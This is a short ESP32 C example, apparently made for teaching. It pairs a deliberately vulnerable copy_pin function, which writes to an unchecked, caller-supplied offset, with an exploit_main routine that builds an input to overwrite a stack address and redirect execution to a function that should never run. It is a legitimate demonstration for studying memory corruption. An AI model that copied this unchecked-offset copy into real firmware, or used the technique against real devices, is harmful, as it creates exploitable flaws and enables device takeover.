/*  ESP32 Pointer exploit Example

   This example code is in the Public Domain (or CC0 licensed, at your option.)

   Unless required by applicable law or agreed to in writing, this
   software is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
   CONDITIONS OF ANY KIND, either express or implied.
*/
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"

#include "lwip/err.h"
#include "lwip/sys.h"
#define TAG "test"

#define MAX_SSID_LEN 20
#define MAX_PASSWORD_LEN 30

struct command
{
	unsigned int resp_offset;
	unsigned int pin_len;
	char buf[0];
};

int copy_pin(struct command *dest,  struct command *src)
{
    char *d;
    int i;
    char *pin;

    if (!dest || !src) {
	ESP_LOGE(TAG, "dest or src is NULL\n");
	return ESP_FAIL;
    }

    pin = malloc(src->pin_len);
    if (pin == NULL) {
	ESP_LOGE(TAG, "malloc failed");
	return ESP_FAIL;
    }

    memcpy(pin, src->buf, src->pin_len);

    for (i = 0; i < src->pin_len; i++) {
	if (pin[i] == '\0') {
		ESP_LOGE(TAG, "PIN is wrong");
		return ESP_FAIL;
	}
    }

    d = dest->buf + src->resp_offset;
    memcpy(d,pin,src->pin_len);
    free(pin);

    return ESP_OK;
}

int parse_data(char *data, int len)
{
    char buf[100]={0};

    if (!data) {
	ESP_LOGE(TAG, "data is NULL\n");
	return ESP_FAIL;
    }

    if (len > sizeof(buf)) {
	ESP_LOGE(TAG, "len > sizeof(buf) = %d > %d", len, sizeof(buf));
	return ESP_FAIL;
    }

    return copy_pin((struct command *)buf,(struct command *)data);
}

void _print_error(void)
{
	ESP_LOGE(TAG, "SHALL NOT BE HERE %s:%d", __FUNCTION__, __LINE__);
	return;
}

void exploit_main(void)
{
    //Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
      ESP_ERROR_CHECK(nvs_flash_erase());
      ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    int buf[3];
    buf[0] = -0x50; //pin_start
    buf[1] = 4; //pin_len
    buf[2] = (int)_print_error+3;

    ESP_LOGI(TAG, "final string: %s string end", (char*)buf);

    (void) parse_data((char *)buf,sizeof(buf));
    ESP_LOGE(TAG, "%s:%d", __FUNCTION__, __LINE__);
}
